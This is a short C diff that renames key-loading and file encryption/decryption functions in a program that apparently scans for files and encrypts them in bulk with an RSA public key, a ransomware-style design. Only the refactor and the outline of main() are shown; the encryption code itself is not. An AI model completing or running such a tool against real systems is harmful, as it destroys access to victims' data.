@@ -10,7 +10,7 @@
 #include <openssl/decoder.h>
 
 #include "files_finder.h"
-#include "crypto.h"
+#include "crypto_rsa.h"
 
 int g_safeMode = 1;
 int g_encryption = 0;
@@ -126,13 +126,13 @@ int main(int argc, char const *argv[])
     if (g_encryption)
     {
         /* Get RSA public key from a file */
-        EVP_PKEY* p_pubKey = load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
+        EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
 
         printf("[+] Encryption key GET success\n");
 
         /* Encrypt files */
         printf("[+] Encrypting files\n");
-        encrypt_files(p_listFileData, p_pubKey);
+        rsa_encrypt_files(p_listFileData, p_pubKey);
         printf("[+] Files encrypted\n");
 
         EVP_PKEY_free(p_pubKey);
@@ -141,13 +141,13 @@ int main(int argc, char const *argv[])
     if (g_decryption)
     {
         /* Get RSA private key from a file */
-        EVP_PKEY* p_privKey = load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
+        EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
 
         printf("[+] Encryption key GET success\n");
 
         /* Decrypt files */
         printf("[+] Decrypting files\n");
-        decrypt_files(p_listFileData, p_privKey);
+        rsa_decrypt_files(p_listFileData, p_privKey);
         printf("[+] Files decrypted\n");
 
         EVP_PKEY_free(p_privKey);
